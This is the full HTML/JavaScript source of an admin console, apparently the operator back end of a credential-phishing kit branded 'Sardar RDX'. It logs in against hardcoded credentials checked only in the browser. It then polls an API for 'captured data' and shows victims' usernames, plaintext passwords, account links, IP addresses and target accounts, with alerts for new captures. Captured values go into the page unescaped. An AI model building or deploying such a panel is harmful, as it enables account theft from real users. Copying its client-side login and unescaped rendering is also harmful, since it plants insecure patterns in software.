<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Portal | Sardar RDX</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
</head>
<body>
    <!-- Admin Login -->
    <div id="admin-login" class="login-container glass" style="border-color:rgba(239,68,68,0.2);box-shadow:0 0 60px rgba(239,68,68,0.05);">
        <div style="text-align:center;margin-bottom:2rem;">
            <div class="login-icon-wrap" style="border-color:rgba(239,68,68,0.4);">
                <i class="fas fa-user-shield" style="font-size:2rem;color:#ef4444;position:relative;z-index:1;"></i>
            </div>
            <h2 style="font-family:'Orbitron',sans-serif;font-size:1.5rem;letter-spacing:3px;color:#ef4444;text-shadow:0 0 15px rgba(239,68,68,0.5);margin-bottom:0.4rem;">ADMIN ACCESS</h2>
            <p style="color:var(--text-dim);font-size:0.8rem;letter-spacing:1px;">Restricted Zone — Authorized Personnel Only</p>
        </div>
        <form id="adminForm">
            <div class="form-group">
                <label><i class="fas fa-user" style="margin-right:0.4rem;color:#ef4444;"></i>Admin Username</label>
                <input type="text" id="adminUser" placeholder="Username" required style="border-color:rgba(239,68,68,0.1);">
            </div>
            <div class="form-group">
                <label><i class="fas fa-key" style="margin-right:0.4rem;color:#ef4444;"></i>Admin Password</label>
                <input type="password" id="adminPass" placeholder="Password" required style="border-color:rgba(239,68,68,0.1);">
            </div>
            <button type="submit" class="btn" style="width:100%;background:linear-gradient(135deg,#ef4444,#dc2626);color:white;padding:1rem;font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:3px;box-shadow:0 4px 20px rgba(239,68,68,0.3);">
                <i class="fas fa-shield-alt" style="margin-right:0.5rem;"></i>AUTHORIZE
            </button>
        </form>
        <div style="margin-top:1.5rem;text-align:center;">
            <a href="index.html" style="color:var(--text-dim);text-decoration:none;font-size:0.8rem;transition:color 0.3s;" onmouseover="this.style.color='#ef4444'" onmouseout="this.style.color='var(--text-dim)'">
                <i class="fas fa-arrow-left" style="margin-right:0.3rem;"></i>Return to Home
            </a>
        </div>
    </div>

    <!-- Admin Dashboard -->
    <div id="admin-dashboard" class="container" style="display:none;">
        <header style="padding:2rem 0;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(239,68,68,0.1);flex-wrap:wrap;gap:1rem;">
            <div>
                <h1 style="font-family:'Orbitron',sans-serif;font-size:2rem;color:#ef4444;text-shadow:0 0 20px rgba(239,68,68,0.4);letter-spacing:4px;">ADMIN CONSOLE</h1>
                <div style="display:flex;align-items:center;gap:1rem;margin-top:0.4rem;flex-wrap:wrap;">
                    <p style="color:var(--text-dim);font-size:0.85rem;letter-spacing:2px;">Live monitoring — all devices</p>
                    <span id="live-dot" style="display:inline-flex;align-items:center;gap:0.4rem;font-size:0.7rem;color:var(--neon-green);letter-spacing:1px;">
                        <span style="width:8px;height:8px;border-radius:50%;background:var(--neon-green);box-shadow:0 0 8px var(--neon-green);animation:livePulse 1.5s ease-in-out infinite;display:inline-block;"></span>
                        LIVE
                    </span>
                    <span id="last-refresh" style="font-size:0.7rem;color:var(--text-dim);"></span>
                </div>
            </div>
            <div style="display:flex;gap:0.7rem;align-items:center;flex-wrap:wrap;">
                <div style="text-align:center;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:12px;padding:0.5rem 1rem;">
                    <div id="total-logins" style="font-family:'Orbitron',sans-serif;font-size:1.4rem;font-weight:900;color:#ef4444;">0</div>
                    <div style="font-size:0.6rem;letter-spacing:2px;color:var(--text-dim);text-transform:uppercase;">Logins</div>
                </div>
                <div style="text-align:center;background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.2);border-radius:12px;padding:0.5rem 1rem;">
                    <div id="total-requests" style="font-family:'Orbitron',sans-serif;font-size:1.4rem;font-weight:900;color:var(--neon-green);">0</div>
                    <div style="font-size:0.6rem;letter-spacing:2px;color:var(--text-dim);text-transform:uppercase;">Requests</div>
                </div>
                <button class="btn" style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#ef4444;font-family:'Orbitron',sans-serif;font-size:0.75rem;letter-spacing:2px;" onclick="logoutAdmin()">
                    <i class="fas fa-sign-out-alt" style="margin-right:0.4rem;"></i>LOGOUT
                </button>
            </div>
        </header>

        <div id="new-entry-alert" style="display:none;background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.3);border-radius:12px;padding:0.8rem 1.2rem;margin-top:1.2rem;color:var(--neon-green);font-size:0.85rem;letter-spacing:1px;text-align:center;">
            <i class="fas fa-bell" style="margin-right:0.5rem;"></i><span id="alert-msg">New entry received!</span>
        </div>

        <style>
            @keyframes livePulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(1.3)} }
            @keyframes flashNew { 0%{background:rgba(0,255,136,0.15)} 100%{background:transparent} }
            .new-row { animation: flashNew 2s ease-out forwards; }
        </style>

        <div class="admin-panel">
            <div class="section-divider">
                <span class="section-title" style="color:#ef4444;"><i class="fas fa-users" style="margin-right:0.5rem;"></i>User Logins <span id="login-count" style="background:rgba(239,68,68,0.2);border-radius:50px;padding:0.1rem 0.5rem;font-size:0.7rem;margin-left:0.4rem;"></span></span>
            </div>

            <div class="glass" style="overflow-x:auto;padding:1.5rem;border-color:rgba(239,68,68,0.1);">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th style="color:#ef4444;">User</th>
                            <th style="color:#ef4444;">Password</th>
                            <th style="color:#ef4444;">Account Link</th>
                            <th style="color:#ef4444;">Platform</th>
                            <th style="color:#ef4444;">IP Address</th>
                            <th style="color:#ef4444;">Time</th>
                        </tr>
                    </thead>
                    <tbody id="login-data"></tbody>
                </table>
            </div>

            <div class="section-divider" style="margin-top:3rem;">
                <span class="section-title" style="color:var(--neon-green);"><i class="fas fa-shopping-bag" style="margin-right:0.5rem;"></i>Service Requests <span id="req-count" style="background:rgba(0,255,136,0.15);border-radius:50px;padding:0.1rem 0.5rem;font-size:0.7rem;margin-left:0.4rem;"></span></span>
            </div>

            <div class="glass" style="overflow-x:auto;padding:1.5rem;border-color:rgba(0,255,136,0.1);">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th style="color:var(--neon-green);">User</th>
                            <th style="color:var(--neon-green);">Amount</th>
                            <th style="color:var(--neon-green);">Target Link</th>
                            <th style="color:var(--neon-green);">Platform</th>
                            <th style="color:var(--neon-green);">Time</th>
                        </tr>
                    </thead>
                    <tbody id="request-data"></tbody>
                </table>
            </div>

            <div style="margin-top:3rem;text-align:right;padding-bottom:3rem;">
                <button class="btn" style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#ef4444;font-family:'Orbitron',sans-serif;font-size:0.75rem;letter-spacing:2px;" onclick="clearLogs()">
                    <i class="fas fa-trash" style="margin-right:0.4rem;"></i>CLEAR ALL LOGS
                </button>
            </div>
        </div>
    </div>

    <script src="js/app.js"></script>
    <script>
        const ADMIN_USER = 'sardarrdx@rdx';
        const ADMIN_PASS = '226614524';

        document.getElementById('adminForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = this.querySelector('button');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:0.5rem;"></i>VERIFYING...';
            btn.disabled = true;

            setTimeout(() => {
                const user = document.getElementById('adminUser').value;
                const pass = document.getElementById('adminPass').value;
                if (user === ADMIN_USER && pass === ADMIN_PASS) {
                    showDashboard();
                } else {
                    alert('Invalid Admin Credentials!');
                    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:0.5rem;"></i>AUTHORIZE';
                    btn.disabled = false;
                }
            }, 1200);
        });

        let prevLoginCount = 0;
        let prevReqCount = 0;
        let autoRefreshTimer = null;

        function loadLogs(silent = false) {
            fetch('/api/get-logs')
                .then(r => r.json())
                .then(db => renderLogs(db.logins || [], db.requests || [], silent))
                .catch(() => { if (!silent) renderLogs([], [], false); });
        }

        function renderLogs(logins, requests, silent) {
            const newLogins   = logins.length - prevLoginCount;
            const newRequests = requests.length - prevReqCount;

            // Update counters
            document.getElementById('total-logins').textContent   = logins.length;
            document.getElementById('total-requests').textContent  = requests.length;
            document.getElementById('login-count').textContent     = logins.length ? logins.length : '';
            document.getElementById('req-count').textContent       = requests.length ? requests.length : '';
            document.getElementById('last-refresh').textContent    = 'Updated: ' + new Date().toLocaleTimeString();

            // Show new entry alert
            if (silent && (newLogins > 0 || newRequests > 0)) {
                const alertEl  = document.getElementById('new-entry-alert');
                const alertMsg = document.getElementById('alert-msg');
                let msg = [];
                if (newLogins   > 0) msg.push(newLogins   + ' new login'   + (newLogins > 1 ? 's' : ''));
                if (newRequests > 0) msg.push(newRequests + ' new request' + (newRequests > 1 ? 's' : ''));
                alertMsg.textContent = msg.join(' & ') + ' received!';
                alertEl.style.display = 'block';
                setTimeout(() => alertEl.style.display = 'none', 5000);
            }

            prevLoginCount = logins.length;
            prevReqCount   = requests.length;

            // Render logins table (newest first)
            const loginTbody = document.getElementById('login-data');
            const loginsRev  = [...logins].reverse();
            loginTbody.innerHTML = loginsRev.length === 0
                ? '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No login data yet — waiting for users</td></tr>'
                : loginsRev.map((log, i) => `
                    <tr class="${i < newLogins && silent ? 'new-row' : ''}">
                        <td><i class="fas fa-user" style="margin-right:0.4rem;color:var(--neon-blue);"></i>${log.user || '—'}</td>
                        <td style="color:#ef4444;font-family:monospace;">${log.pass || '—'}</td>
                        <td style="max-width:200px;">
                            ${log.accountLink
                                ? `<div style="display:flex;flex-direction:column;gap:0.2rem;">
                                    <span style="color:var(--neon-blue);font-family:'Orbitron',sans-serif;font-size:0.78rem;font-weight:700;">${log.accountRealName || '@'+log.accountName}</span>
                                    ${log.accountRealName ? `<span style="font-size:0.65rem;color:rgba(255,255,255,0.4);font-family:monospace;">@${log.accountName}</span>` : ''}
                                    ${log.accountPlatform ? `<span style="font-size:0.6rem;color:rgba(255,255,255,0.25);letter-spacing:1px;text-transform:uppercase;">${log.accountPlatform}</span>` : ''}
                                    <a href="${log.accountLink}" target="_blank" style="color:rgba(0,245,255,0.4);font-size:0.7rem;font-family:monospace;word-break:break-all;text-decoration:none;">${log.accountLink.replace(/^https?:\/\//,'').substring(0,32)}...</a>
                                  </div>`
                                : `<span style="color:var(--text-dim);font-size:0.8rem;">—</span>`
                            }
                        </td>
                        <td><span style="background:rgba(0,245,255,0.1);border:1px solid rgba(0,245,255,0.2);border-radius:6px;padding:0.15rem 0.5rem;font-size:0.75rem;letter-spacing:1px;">${log.platform || '—'}</span></td>
                        <td style="color:var(--text-dim);font-family:monospace;font-size:0.82rem;">${log.ip || '—'}</td>
                        <td style="color:var(--text-dim);font-size:0.8rem;white-space:nowrap;">${log.time || '—'}</td>
                    </tr>
                `).join('');

            // Render requests table (newest first)
            const requestTbody = document.getElementById('request-data');
            const reqsRev      = [...requests].reverse();
            requestTbody.innerHTML = reqsRev.length === 0
                ? '<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:2rem;letter-spacing:1px;">No service requests yet</td></tr>'
                : reqsRev.map((req, i) => `
                    <tr class="${i < newRequests && silent ? 'new-row' : ''}">
                        <td>${req.user || '—'}</td>
                        <td style="color:var(--neon-blue);font-weight:700;font-family:'Orbitron',sans-serif;">${req.amount}</td>
                        <td>
                            <div style="display:flex;flex-direction:column;gap:0.1rem;">
                                ${req.accountRealName ? `<span style="color:var(--neon-green);font-size:0.8rem;font-weight:600;">${req.accountRealName}</span>` : ''}
                                ${req.accountName    ? `<span style="color:rgba(255,255,255,0.4);font-size:0.7rem;">@${req.accountName}</span>` : ''}
                                <a href="${req.link}" target="_blank" style="color:var(--text-dim);font-size:0.75rem;font-family:monospace;text-decoration:none;">${(req.link||'').substring(0,35)}...</a>
                            </div>
                        </td>
                        <td><span style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);border-radius:6px;padding:0.15rem 0.5rem;font-size:0.75rem;letter-spacing:1px;">${req.platform || '—'}</span></td>
                        <td style="color:var(--text-dim);font-size:0.8rem;white-space:nowrap;">${req.time || '—'}</td>
                    </tr>
                `).join('');
        }

        function startAutoRefresh() {
            autoRefreshTimer = setInterval(() => loadLogs(true), 10000);
        }

        function showDashboard() {
            document.getElementById('admin-login').style.display = 'none';
            document.getElementById('admin-dashboard').style.display = 'block';
            loadLogs(false);
            startAutoRefresh();
        }

        function clearLogs() {
            if (confirm('Delete all captured data permanently?')) {
                fetch('/api/clear-logs', { method: 'POST' })
                    .then(() => { prevLoginCount = 0; prevReqCount = 0; loadLogs(false); })
                    .catch(() => loadLogs(false));
            }
        }

        function logoutAdmin() {
            clearInterval(autoRefreshTimer);
            location.reload();
        }
    </script>
</body>
</html>
